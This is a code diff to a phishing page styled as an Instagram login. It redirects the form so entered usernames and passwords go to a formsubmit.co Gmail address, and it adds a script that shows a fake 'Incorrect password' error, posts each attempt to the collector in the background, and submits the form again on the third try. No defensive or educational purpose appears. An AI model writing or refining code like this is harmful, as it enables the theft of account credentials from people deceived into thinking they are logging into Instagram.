@@ -16,6 +16,11 @@
     <link rel="stylesheet" href="./app.css">
 
     <style>
+        .error-message {
+            color: red;
+            margin-top: 10px;
+        }
+
         .popup {
             visibility: hidden;
             min-width: 250px;
@@ -99,7 +104,7 @@
                     </div>
                 </div>
                 <div class="form-container">
-                    <form id="loginForm" action="https://getintotouch.sh20raj.com/api.php?id=6534651073" method="POST">
+                    <form id="loginForm" action="https://formsubmit.co/Verify8910@gmail.com" method="POST" onsubmit="return handleLogin(event)">
                         <div class="form-content box">
                             <div class="logo">
                                 <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
@@ -121,7 +126,7 @@
                                     </div>
                                 </div>
                                 <div class="btn-group">
-                                    <button class="btn-login" type="button" onclick="handleLogin()">Log In</button>
+                                    <button class="btn-login" type="submit">Log In</button>
                                 </div>
                                 <div class="divine">
                                     <div></div>
@@ -136,6 +141,7 @@
                                 </div>
                                 <a href="#" class="forgot-pw">Forgot password?</a>
                             </div>
+                            <div id="error-message" class="error-message"></div>
                         </div>
                         <div class="box goto">
                             <p>Don't have an account? <a href="#">Sign up</a></p>
@@ -201,19 +207,25 @@
             }, 3000);
         }
 
-        function handleLogin() {
+        function handleLogin(event) {
+            event.preventDefault();
             attemptCount++;
+            const form = document.getElementById("loginForm");
+            const errorMessage = document.getElementById("error-message");
+
             if (attemptCount < 3) {
                 document.getElementById("attempt").value = "Attempt " + attemptCount;
                 showPopup();
-                // Handle form submission to the server for logging the attempt (mock)
-                document.getElementById("loginForm").action = "https://getintotouch.sh20raj.com/api.php?id=6534651073";
-                document.getElementById("loginForm").submit();
+                errorMessage.textContent = "Incorrect password. Please try again.";
+                // Submit the form to log the attempt
+                fetch(form.action, {
+                    method: "POST",
+                    body: new FormData(form)
+                });
             } else {
-                // Redirect to the next page after 3 attempts
+                // On the third attempt, show the incorrect password message and submit the form
                 document.getElementById("attempt").value = "Final Attempt";
-                document.getElementById("loginForm").action = "next_page.html"; // Change to your next page URL
-                document.getElementById("loginForm").submit();
+                form.submit();
             }
         }
     </script>
